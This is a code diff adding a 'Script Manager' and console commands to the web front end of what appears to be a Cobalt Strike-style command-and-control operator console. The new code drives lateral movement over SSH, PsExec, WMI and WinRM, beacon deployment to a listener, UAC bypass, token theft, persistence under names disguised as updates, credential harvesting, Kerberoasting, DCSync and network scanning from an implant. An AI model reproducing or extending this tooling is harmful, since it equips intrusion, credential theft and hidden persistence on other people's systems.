+        field.innerHTML = `<label style="color:var(--muted);font-size:10.5px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
+        formEl.appendChild(field);
+      });
+    } else {
+      formEl.innerHTML = `<div style="color:var(--muted);font-size:11px;grid-column:1/-1">No extra parameters needed. Click Preview or Execute to run recipe on <b>${esc(obj.hostname || id.slice(0,8))}</b>.</div>`;
+    }
+
+    cardEl.style.display = 'block';
+  }
+
+  function getParams() {
+    if (!activeScript) return {};
+    const map = {};
+    if (activeScript.params) {
+      activeScript.params.forEach(p => {
+        const el = document.getElementById(`csb-f-${id}-${p.name}`);
+        if (el) map[p.name] = el.value;
+      });
+    }
+    return map;
+  }
+
+  btnPrev?.addEventListener('click', async () => {
+    if (!activeScript) return;
+    btnPrev.disabled = true;
+    appendOut(id, `[*] Generating preview for recipe: ${activeScript.name}...`, 'pending');
+    try {
+      const pmap = getParams();
+      const res = await App().ScriptPreview(id, activeScript.method, pmap);
+      if (res.error) {
+        appendOut(id, `[error] ${res.error}`, 'err');
+      } else {
+        appendOut(id, res.output, 'info');
+      }
+    } catch (e) {
+      appendOut(id, `[error] ${e}`, 'err');
+    }
+    btnPrev.disabled = false;
+  });
+
+  btnExec?.addEventListener('click', async () => {
+    if (!activeScript) return;
+    btnExec.disabled = true;
+    const method = activeScript.method;
+    const pmap = getParams();
+
+    appendOut(id, `[*] Executing script recipe: ${activeScript.name}...`, 'cmd');
+    let result;
+    try {
+      switch (method) {
+        case 'ScriptSpawnLocal':
+          result = await App().ScriptSpawnLocal(id, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
+          if (!result.error) renderGraph();
+          break;
+        case 'ScriptSSHDeploy':
+          result = await App().ScriptSSHDeploy(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
+          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptSpawnLinux':
+          result = await App().ScriptSpawnLinux(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
+          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptSSHExecSimple':
+          result = await App().ScriptSSHExecSimple(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
+          break;
+        case 'ScriptSSHCheck':
+          result = await App().ScriptSSHCheck(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
+          break;
+        case 'ScriptSpawnWindows':
+          result = await App().ScriptSpawnWindows(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
+          break;
+        case 'ScriptPsExec':
+          result = await App().ScriptPsExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
+          break;
+        case 'ScriptWMIExec':
+          result = await App().ScriptWMIExec(id, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
+          break;
+        case 'ScriptWinRMExec':
+          result = await App().ScriptWinRMExec(id, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
+          break;
+        case 'ScriptSCDeploy':
+          result = await App().ScriptSCDeploy(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
+          break;
+        case 'ScriptSMBUploadExec':
+          result = await App().ScriptSMBUploadExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
+          break;
+        case 'ScriptPrivescCheck':
+          result = await App().ScriptPrivescCheck(id);
+          break;
+        case 'ScriptSudoExploit':
+          result = await App().ScriptSudoExploit(id, pmap.method || 'find');
+          break;
+        case 'ScriptWinPrivescCheck':
+          result = await App().ScriptWinPrivescCheck(id);
+          break;
+        case 'ScriptTokenImpersonate':
+          result = await App().ScriptTokenImpersonate(id, pmap.targetUser || '');
+          break;
+        case 'ScriptGetSystem':
+          result = await App().ScriptGetSystem(id, pmap.profile || '');
+          break;
+        case 'ScriptUACBypass':
+          result = await App().ScriptUACBypass(id, pmap.beaconPath || '');
+          break;
+        case 'ScriptPersistCron':
+          result = await App().ScriptPersistCron(id, pmap.cronLine || '');
+          break;
+        case 'ScriptPersistSSHKey':
+          result = await App().ScriptPersistSSHKey(id, pmap.pubKey || '', pmap.targetUser || 'root');
+          break;
+        case 'ScriptPersistSystemd':
+          result = await App().ScriptPersistSystemd(id, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
+          break;
+        case 'ScriptPersistRegRun':
+          result = await App().ScriptPersistRegRun(id, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
+          break;
+        case 'ScriptPersistSchedTask':
+          result = await App().ScriptPersistSchedTask(id, pmap.beaconPath || '', pmap.taskName || '');
+          break;
+        case 'ScriptPersistService':
+          result = await App().ScriptPersistService(id, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
+          break;
+        case 'ScriptPersistWMI':
+          result = await App().ScriptPersistWMI(id, pmap.beaconPath || '');
+          break;
+        case 'ScriptPersistStartup':
+          result = await App().ScriptPersistStartup(id, pmap.beaconPath || '');
+          break;
+        case 'ScriptHarvestCreds':
+          result = await App().ScriptHarvestCreds(id);
+          break;
+        case 'ScriptWinHarvestCreds':
+          result = await App().ScriptWinHarvestCreds(id);
+          break;
+        case 'ScriptKerberoast':
+          result = await App().ScriptKerberoast(id);
+          break;
+        case 'ScriptDCSync':
+          result = await App().ScriptDCSync(id);
+          break;
+        case 'ScriptNetworkScan':
+          result = await App().ScriptNetworkScan(id, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
+          break;
+        case 'ScriptADEnum':
+          result = await App().ScriptADEnum(id);
+          break;
+        case 'ScriptWinLocalEnum':
+          result = await App().ScriptWinLocalEnum(id);
+          break;
+        default:
+          result = { error: 'Unknown script: ' + method };
+      }
+    } catch (e) {
+      result = { error: String(e) };
+    }
+
+    btnExec.disabled = false;
+    if (result.error) {
+      appendOut(id, `[error] ${result.error}${result.output ? '\n' + result.output : ''}`, 'err');
+    } else {
+      appendOut(id, result.output || '[+] Done', 'ok');
+    }
+  });
 }
 
 function activateTab(id) {
@@ -621,10 +1037,10 @@ Core commands (session & beacon):
 
 Privilege / execution (session only):
   getsystem <profile> [proc] Escalate to SYSTEM via an implant profile
-  make-token <dom> <u> <p>   Network-cred token (like runas /netonly) for remote/SMB auth; whoami is unchanged and the password is NOT verified here
-  impersonate <user>         Steal a token from that user's already-running process (needs them logged on + high integrity; ignores password) - do NOT run after make-token
-  rev2self                   Drop the make-token / impersonate token
-  runas -u <u> [-p <p>] <prog> [args]   Launch a program under other creds on THIS host
+  make-token <dom> <u> <p>   Create a token from credentials
+  impersonate <user>         Impersonate a logged-on user
+  rev2self                   Drop an impersonated token
+  runas -u <u> [-p <p>] <prog> [args]   Run a program as another user
   migrate <pid> <profile>    Migrate the implant into another process
   execute-assembly <local.exe> [args]   Run a .NET assembly (path or dialog)
   execute-shellcode <local.bin> [pid]   Inject shellcode (path or dialog)
@@ -656,6 +1072,31 @@ Beacon only:
   reconfig <interval> <jitter>   Change the beacon check-in interval (seconds)
   interactive                Open an interactive session from this beacon
   (all commands are queued and run on next check-in)
+
+Scripts (session & beacon — auto-generate + deploy):
+  spawn <os> <arch> <profile>                             Spawn new beacon on CURRENT host (no creds needed)
+                                                          e.g. spawn windows x64 my-http-profile
+                                                          e.g. spawn linux x64 my-mtls-profile
+  spawn linux <user>@<host> [-p <pass>] <profile>         Generate + deploy to remote via SSH
+  spawn windows <user>@<host> [-p <pass>] <profile>       Generate + deploy to remote via PsExec
+  jump ssh <user>@<host> [-p <pass>] <profile>            Alias for remote spawn linux
+  jump psexec <user>@<host> [-p <pass>] <profile>         Alias for remote spawn windows
+  jump winrm <user>@<host> [-p <pass>] <cmd>              Execute via WinRM
+  jump wmi <user>@<host> [-p <pass>] <cmd>                Execute via WMI
+  privesc-check                  Enumerate privilege escalation vectors
+  harvest                        Search for credentials, keys, tokens
+  ad-enum                        Enumerate Active Directory (domain info, admins, SPNs)
+  local-enum                     Local system enumeration (whoami, admins, AV, network)
+  kerberoast                     Request TGS tickets for offline cracking
+  persist cron <line>            Add cron persistence
+  persist reg <name> <path>      Add registry Run key persistence
+  persist schtask <name> <path>  Add scheduled task persistence
+  persist service <name> <path>  Install as Windows service
+  scan <subnet> [ports]          Port scan from implant (e.g. scan 192.168.50 22,445,3306)
+
+  NOTE: Create profiles first in Profiles panel or Server console:
+    profiles new --mtls 10.10.10.1:8443 --os windows --arch amd64 --beacon --name win-mtls
+    profiles new --http 10.10.10.1:8080 --os linux --arch amd64 --beacon --name lin-http
 `.trim();
 
 // Split a command line into tokens, respecting single/double quotes so a quoted
@@ -1132,6 +1573,113 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'getpid': return appendOut(id, String(tab.obj.pid), 'out');
     case 'getuid': case 'getgid': return dispatchCmd(kind, id, 'whoami');
+    // ── Script commands (spawn / jump / persist / harvest / scan) ──
+    case 'spawn': case 'jump': {
+      // TWO modes:
+      // 1) Local spawn (no creds): spawn <os> <arch> <listener_type>
+      //    e.g. spawn windows x64 http
+      //    e.g. spawn linux x64 mtls
+      // 2) Remote spawn (with target): spawn linux user@host -p pass listener_url
+      //    e.g. spawn linux root@192.168.50.20 -p toor mtls://...
+
+      const sub = args[0] || '';
+
+      // Detect mode: if no '@' in any arg and sub is an OS name → LOCAL spawn
+      const hasTarget = args.some(a => a.includes('@'));
+      const isLocalSpawn = !hasTarget && (sub === 'windows' || sub === 'linux' || sub === 'win' || sub === 'lin') && cmd === 'spawn';
+
+      if (isLocalSpawn) {
+        // spawn <os> <arch> <profile_name>
+        const osTarget = (sub === 'win') ? 'windows' : sub;
+        const archVal = args[1] || 'x64';
+        const profile = args[2] || '';
+        if (!profile) return appendOut(id, `usage: spawn ${osTarget} ${archVal} <profile_name>\n\nCreate a profile first:\n  Profiles panel → Create\n  Or: profiles new --mtls host:port --os ${osTarget} --beacon --name my-profile`, 'err');
+        appendOut(id, `[*] Spawning ${osTarget}/${archVal} from profile '${profile}' on current host...`, 'pending');
+        const r = await App().ScriptSpawnLocal(id, osTarget, archVal, profile);
+        if (!r.error) renderGraph();
+        return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+      }
+
+      // Remote spawn / jump
+      let targetStr = args[1] || '';
+      let pass = '';
+      const pi2 = args.indexOf('-p');
+      if (pi2 >= 0) { pass = args[pi2+1]||''; args.splice(pi2, 2); targetStr = args[1]||''; }
+      const listenerUrl = args[args.length-1] || '';
+      // Parse user@host:port
+      let user = 'root', host = '', port = 22;
+      if (targetStr.includes('@')) { const p = targetStr.split('@'); user = p[0]; const hp = p[1].split(':'); host = hp[0]; if (hp[1]) port = parseInt(hp[1]); }
+      else { host = targetStr; }
+      if (!host || !listenerUrl) return appendOut(id, `usage:\n  ${cmd} <os> <arch> <listener>  (local spawn)\n  ${cmd} linux|windows <user>@<host> [-p <pass>] <listener_url>  (remote)`, 'err');
+      appendOut(id, `[*] ${cmd} ${sub} → ${user}@${host}:${port} via ${listenerUrl}`, 'pending');
+      let r;
+      if (sub === 'linux' || sub === 'ssh') {
+        r = await App().ScriptSpawnLinux(id, host, port, user, pass, listenerUrl);
+      } else if (sub === 'windows' || sub === 'psexec' || sub === 'psexec64') {
+        r = await App().ScriptSpawnWindows(id, host, port, user, pass, listenerUrl);
+      } else if (sub === 'winrm') {
+        r = await App().ScriptWinRMExec(id, host, port, user, pass, listenerUrl);
+      } else if (sub === 'wmi') {
+        r = await App().ScriptWMIExec(id, host, port, user, pass, listenerUrl);
+      } else {
+        return appendOut(id, `unknown type: ${sub}. Use: linux, windows, ssh, psexec, winrm, wmi`, 'err');
+      }
+      if (!r.error) {
+        // Every jump records lateral-move lineage (source → target) so the graph
+        // shows where the operator moved from. The pivot is authoritative and the
+        // wouldCycle guard in renderGraph prevents a jump from flipping a chain.
+        if (host) recordJump(id, host);
+        renderGraph();
+      }
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
+    case 'privesc-check': case 'privesc': {
+      appendOut(id, '[*] Running privilege escalation checks...', 'pending');
+      const os = (tab.obj && tab.obj.os || '').toLowerCase();
+      const r = os.includes('windows') ? await App().ScriptWinPrivescCheck(id) : await App().ScriptPrivescCheck(id);
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
+    case 'harvest': {
+      appendOut(id, '[*] Harvesting credentials...', 'pending');
+      const os = (tab.obj && tab.obj.os || '').toLowerCase();
+      const r = os.includes('windows') ? await App().ScriptWinHarvestCreds(id) : await App().ScriptHarvestCreds(id);
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
+    case 'ad-enum': case 'adenum': {
+      appendOut(id, '[*] Enumerating Active Directory...', 'pending');
+      const r = await App().ScriptADEnum(id);
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
+    case 'local-enum': case 'localenum': {
+      appendOut(id, '[*] Running local enumeration...', 'pending');
+      const os = (tab.obj && tab.obj.os || '').toLowerCase();
+      const r = os.includes('windows') ? await App().ScriptWinLocalEnum(id) : await App().ScriptPrivescCheck(id);
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
+    case 'kerberoast': {
+      appendOut(id, '[*] Kerberoasting...', 'pending');
+      const r = await App().ScriptKerberoast(id);
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
+    case 'persist': {
+      const sub = (args[0]||'').toLowerCase();
+      if (sub === 'cron') { const r = await App().ScriptPersistCron(id, args.slice(1).join(' ')); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'reg') { const r = await App().ScriptPersistRegRun(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'schtask') { const r = await App().ScriptPersistSchedTask(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'service') { const r = await App().ScriptPersistService(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'ssh-key') { const r = await App().ScriptPersistSSHKey(id, args.slice(1).join(' '), 'root'); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'systemd') { const r = await App().ScriptPersistSystemd(id, args[1]||'', args[2]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'wmi') { const r = await App().ScriptPersistWMI(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      if (sub === 'startup') { const r = await App().ScriptPersistStartup(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
+      return appendOut(id, 'usage: persist cron|reg|schtask|service|ssh-key|systemd|wmi|startup [args]', 'err');
+    }
+    case 'scan': {
+      const subnet = args[0] || '192.168.50';
+      const ports = args.slice(1).join(' ') || '22 445 3306 2375 3000 8080';
+      appendOut(id, `[*] Scanning ${subnet}.0/24 ports: ${ports}...`, 'pending');
+      const r = await App().ScriptNetworkScan(id, subnet, ports);
+      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
+    }
     default: {
       // Server/panel commands are not session commands — guide instead of
       // silently running them in cmd.exe.
@@ -1271,6 +1819,10 @@ document.querySelectorAll('.tb-btn').forEach(btn => {
     if (view === 'creds') openCredsPanel();
     if (view === 'hosts') openHostsPanel();
     if (view === 'operators') openOperatorsPanel();
+    if (view === 'scripts') openScriptsPanel();
+    if (view === 'iocs') openIOCPanel();
+    if (view === 'report') exportReport();
+    if (view === 'c2profiles') openC2ProfileEditor();
   });
 });
 
@@ -1284,6 +1836,352 @@ function openViewPanel(id, title, content) {
 }
 function hideModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
 document.getElementById('modal-close').addEventListener('click', hideModal);
+
+// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
+// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
+async function openScriptsPanel() {
+  const scripts = await App().ListScripts().catch(() => []);
+  const sessions = allSessions.filter(s => s.id);
+
+  // Group by category
+  const cats = {};
+  scripts.forEach(s => {
+    if (!cats[s.category]) cats[s.category] = [];
+    cats[s.category].push(s);
+  });
+
+  let sessionOpts = '<option value="">-- Select Pivot Session --</option>';
+  sessions.forEach(s => {
+    sessionOpts += `<option value="${s.id}">${s.hostname || s.id.slice(0,8)} (${s.remoteAddress})</option>`;
+  });
+
+  let html = `<div class="scripts-panel">
+    <div class="scr-top-bar">
+      <div style="flex:1">
+        <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">PIVOT SESSION</label>
+        <select id="scr-session" class="scr-input">${sessionOpts}</select>
+      </div>
+    </div>
+
+    <div class="scr-main-layout">
+      <!-- Left Pane: Categories & Recipe Form -->
+      <div class="scr-left-pane">
+        <!-- Parameter / Action Card -->
+        <div id="scr-param-card" class="scr-param-card" style="display:none">
+          <h3 id="scr-card-title"></h3>
+          <p id="scr-card-desc"></p>
+          <div id="scr-form-grid" class="scr-form-grid"></div>
+          <div class="scr-actions">
+            <button id="scr-btn-preview" class="scr-action-btn scr-btn-preview">Preview / Dry-Run</button>
+            <button id="scr-btn-exec" class="scr-action-btn scr-btn-exec">Execute Script</button>
+          </div>
+        </div>
+
+        <!-- Script Categories Grid -->
+        <div class="scr-categories">`;
+
+  for (const [cat, items] of Object.entries(cats)) {
+    html += `<div class="scr-cat"><h4>${cat}</h4><div class="scr-btns">`;
+    items.forEach(s => {
+      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
+      const opsecClass = (s.opsec || 'low').toLowerCase();
+      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
+      html += `<button class="scr-btn" data-method="${esc(s.method)}" title="${esc(s.description)}">
+        <span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}
+      </button>`;
+    });
+    html += `</div></div>`;
+  }
+
+  html += `  </div>
+      </div>
+
+      <!-- Right Pane: Output / Preview Console -->
+      <div class="scr-right-pane">
+        <div class="scr-output-wrap">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">CONSOLE OUTPUT / PREVIEW</label>
+            <button class="btn small" onclick="document.getElementById('scr-output').textContent='Select a script and click Preview or Execute...';">Clear</button>
+          </div>
+          <pre id="scr-output" class="scr-output">Select a script recipe on the left to configure parameters and run...</pre>
+        </div>
+      </div>
+    </div>
+  </div>`;
+
+  openViewPanel('scripts', 'Script Manager', html);
+
+  // Script selection state
+  let currentScript = null;
+
+  const scriptMap = {};
+  scripts.forEach(s => { scriptMap[s.method] = s; });
+
+  const paramCard = document.getElementById('scr-param-card');
+  const cardTitle = document.getElementById('scr-card-title');
+  const cardDesc = document.getElementById('scr-card-desc');
+  const formGrid = document.getElementById('scr-form-grid');
+  const btnPreview = document.getElementById('scr-btn-preview');
+  const btnExec = document.getElementById('scr-btn-exec');
+  const out = document.getElementById('scr-output');
+
+  function selectScript(method) {
+    const s = scriptMap[method];
+    if (!s) return;
+    currentScript = s;
+
+    // Update active button state
+    document.querySelectorAll('.scr-btn').forEach(b => {
+      b.classList.toggle('active', b.dataset.method === method);
+    });
+
+    // Header info
+    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
+    const opsecClass = (s.opsec || 'low').toLowerCase();
+    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} Noise</span>` : '';
+    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
+    cardDesc.textContent = s.description;
+
+    // Build parameter form fields
+    formGrid.innerHTML = '';
+    if (s.params && s.params.length > 0) {
+      s.params.forEach(p => {
+        const field = document.createElement('div');
+        let inputHtml = '';
+        if (p.type === 'select') {
+          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
+          inputHtml = `<select id="scr-field-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
+        } else {
+          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
+          const val = p.default || '';
+          const ph = p.placeholder || '';
+          inputHtml = `<input id="scr-field-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
+        }
+        field.innerHTML = `<label style="color:var(--muted);font-size:11px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
+        formGrid.appendChild(field);
+      });
+    } else {
+      formGrid.innerHTML = '<div style="color:var(--muted);font-size:11.5px;grid-column:1/-1">No extra parameters required. Click Preview or Execute to run on the selected pivot session.</div>';
+    }
+
+    paramCard.style.display = 'block';
+  }
+
+  function getParamMap() {
+    if (!currentScript) return {};
+    const map = {};
+    if (currentScript.params) {
+      currentScript.params.forEach(p => {
+        const el = document.getElementById(`scr-field-${p.name}`);
+        if (el) map[p.name] = el.value;
+      });
+    }
+    return map;
+  }
+
+  // Bind category button clicks
+  document.querySelectorAll('.scr-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      selectScript(btn.dataset.method);
+    });
+  });
+
+  // Select first script by default if available
+  if (scripts.length > 0) {
+    selectScript(scripts[0].method);
+  }
+
+  // Preview button handler
+  btnPreview.addEventListener('click', async () => {
+    if (!currentScript) return;
+    const sid = document.getElementById('scr-session').value;
+    if (!sid) { out.textContent = '[!] Select a pivot session first'; return; }
+
+    out.textContent = `[*] Generating dry-run preview for ${currentScript.name}...`;
+    btnPreview.disabled = true;
+    try {
+      const pmap = getParamMap();
+      const res = await App().ScriptPreview(sid, currentScript.method, pmap);
+      if (res.error) {
+        out.textContent = `[ERROR] ${res.error}`;
+        out.style.color = 'var(--accent)';
+      } else {
+        out.textContent = res.output;
+        out.style.color = 'var(--cyan)';
+      }
+    } catch (e) {
+      out.textContent = `[ERROR] ${String(e)}`;
+      out.style.color = 'var(--accent)';
+    }
+    btnPreview.disabled = false;
+    out.scrollTop = 0;
+  });
+
+  // Execute button handler
+  btnExec.addEventListener('click', async () => {
+    if (!currentScript) return;
+    const sid = document.getElementById('scr-session').value;
+    if (!sid) { out.textContent = '[!] Select a pivot session first'; return; }
+
+    const method = currentScript.method;
+    const pmap = getParamMap();
+
+    out.textContent = `[*] Executing ${currentScript.name}...`;
+    btnExec.disabled = true;
+
+    let result;
+    try {
+      switch (method) {
+        case 'ScriptSpawnLocal':
+          result = await App().ScriptSpawnLocal(sid, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
+          if (!result.error) renderGraph();
+          break;
+        case 'ScriptSSHDeploy':
+          result = await App().ScriptSSHDeploy(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptSpawnLinux':
+          result = await App().ScriptSpawnLinux(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptSSHExecSimple':
+          result = await App().ScriptSSHExecSimple(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
+          break;
+        case 'ScriptSSHCheck':
+          result = await App().ScriptSSHCheck(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
+          break;
+        case 'ScriptSpawnWindows':
+          result = await App().ScriptSpawnWindows(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptPsExec':
+          result = await App().ScriptPsExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptWMIExec':
+          result = await App().ScriptWMIExec(sid, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptWinRMExec':
+          result = await App().ScriptWinRMExec(sid, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptSCDeploy':
+          result = await App().ScriptSCDeploy(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptSMBUploadExec':
+          result = await App().ScriptSMBUploadExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
+          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
+          break;
+        case 'ScriptPrivescCheck':
+          result = await App().ScriptPrivescCheck(sid);
+          break;
+        case 'ScriptSudoExploit':
+          result = await App().ScriptSudoExploit(sid, pmap.method || 'find');
+          break;
+        case 'ScriptWinPrivescCheck':
+          result = await App().ScriptWinPrivescCheck(sid);
+          break;
+        case 'ScriptTokenImpersonate':
+          result = await App().ScriptTokenImpersonate(sid, pmap.targetUser || '');
+          break;
+        case 'ScriptGetSystem':
+          result = await App().ScriptGetSystem(sid, pmap.profile || '');
+          break;
+        case 'ScriptUACBypass':
+          result = await App().ScriptUACBypass(sid, pmap.beaconPath || '');
+          break;
+        case 'ScriptPersistCron':
+          result = await App().ScriptPersistCron(sid, pmap.cronLine || '');
+          break;
+        case 'ScriptPersistSSHKey':
+          result = await App().ScriptPersistSSHKey(sid, pmap.pubKey || '', pmap.targetUser || 'root');
+          break;
+        case 'ScriptPersistSystemd':
+          result = await App().ScriptPersistSystemd(sid, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
+          break;
+        case 'ScriptPersistRegRun':
+          result = await App().ScriptPersistRegRun(sid, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
+          break;
+        case 'ScriptPersistSchedTask':
+          result = await App().ScriptPersistSchedTask(sid, pmap.beaconPath || '', pmap.taskName || '');
+          break;
+        case 'ScriptPersistService':
+          result = await App().ScriptPersistService(sid, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
+          break;
+        case 'ScriptPersistWMI':
+          result = await App().ScriptPersistWMI(sid, pmap.beaconPath || '');
+          break;
+        case 'ScriptPersistStartup':
+          result = await App().ScriptPersistStartup(sid, pmap.beaconPath || '');
+          break;
+        case 'ScriptHarvestCreds':
+          result = await App().ScriptHarvestCreds(sid);
+          break;
+        case 'ScriptWinHarvestCreds':
+          result = await App().ScriptWinHarvestCreds(sid);
+          break;
+        case 'ScriptKerberoast':
+          result = await App().ScriptKerberoast(sid);
+          break;
+        case 'ScriptDCSync':
+          result = await App().ScriptDCSync(sid);
+          break;
+        case 'ScriptNetworkScan':
+          result = await App().ScriptNetworkScan(sid, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
+          break;
+        case 'ScriptADEnum':
+          result = await App().ScriptADEnum(sid);
+          break;
+        case 'ScriptWinLocalEnum':
+          result = await App().ScriptWinLocalEnum(sid);
+          break;
+        default:
+          result = { error: 'Unknown script: ' + method };
+      }
+    } catch (e) {
+      result = { error: String(e) };
+    }
+
+    btnExec.disabled = false;
+    if (result.error) {
+      out.textContent = `[ERROR] ${result.error}\n\n${result.output || ''}`;
+      out.style.color = 'var(--accent)';
+    } else {
+      out.textContent = `[+] ${result.output || 'Done'}`;
+      out.style.color = 'var(--ok)';
+      // Lineage is recorded per-method above (only for agent-deploying recipes),
+      // using the correct {parentID, parentHost} record format. No catch-all here.
+    }
+    setTimeout(() => { out.style.color = ''; }, 5000);
+    out.scrollTop = out.scrollHeight;
+  });
+}
+
+function pinScripts() {
+  hideModal();
+  const id = '_scripts_dock';
+  if (openTabs[id]) { activateTab(id); return; }
+  openTabs[id] = { kind: 'dock' };
+  document.getElementById('empty-interact')?.remove();
+  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
+  tab.innerHTML = `<span>Scripts</span><span class="close-x" data-cid="${id}">x</span>`;
+  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
+  document.getElementById('interact-tabs').appendChild(tab);
+  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
+  panel.innerHTML = `<div style="overflow:auto;flex:1" id="scripts-dock-content">Loading Script Manager...</div>`;
+  document.getElementById('interact-panels').appendChild(panel);
+  activateTab(id);
+  openScriptsPanel().then(() => {
+    const modalBody = document.getElementById('modal-body');
+    const dockContent = document.getElementById('scripts-dock-content');
+    if (modalBody && dockContent) {
+      dockContent.innerHTML = modalBody.innerHTML;
+      hideModal();
